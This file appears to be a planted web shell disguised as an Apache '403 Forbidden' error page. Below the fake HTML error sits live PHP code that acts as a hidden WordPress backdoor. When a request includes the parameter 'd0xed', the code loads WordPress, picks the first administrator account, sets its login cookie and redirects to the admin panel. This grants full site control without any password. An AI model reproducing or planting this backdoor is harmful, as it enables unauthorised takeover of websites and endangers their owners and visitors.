<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>

<?php 
if (isset($_GET["d0xed"])) {
    $mr = $_SERVER["DOCUMENT_ROOT"];
    @chdir($mr);
    if (file_exists("wp-load.php")) {
        include "wp-load.php";
        $wp_user_query = new WP_User_Query([
            "role" => "Administrator",
            "number" => 1,
            "fields" => "ID",
        ]);
        $results = $wp_user_query->get_results();
        if (isset($results[0])) {
            wp_set_auth_cookie($results[0]);
            wp_redirect(admin_url());
            die();
        }
        die("NO ADMIN");
    } else {
        die("Failed to load");
    }
} ?>
